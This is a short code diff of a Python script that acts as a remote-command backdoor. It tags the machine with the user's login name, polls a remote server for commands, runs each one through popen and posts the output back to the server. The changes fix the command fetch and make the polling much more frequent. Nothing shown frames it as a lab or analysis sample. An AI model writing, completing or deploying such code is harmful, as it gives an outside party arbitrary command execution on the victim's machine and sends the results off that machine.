@@ -17,10 +17,12 @@ username = getlogin() + '.' + token_hex(4)
 print(username)
 
 def request_command():
-  command = requests.get(url + '/get/' + username)
+  command = requests.get(url + '/get/' + username).text
+  print(command)
   stream = popen(command)
   data = stream.read()
   stream.close()
   requests.post(url + '/data/' + username, data=data)
 
-set_interval(request_command, 1000)
+set_interval(request_command, 1)
+request_command()
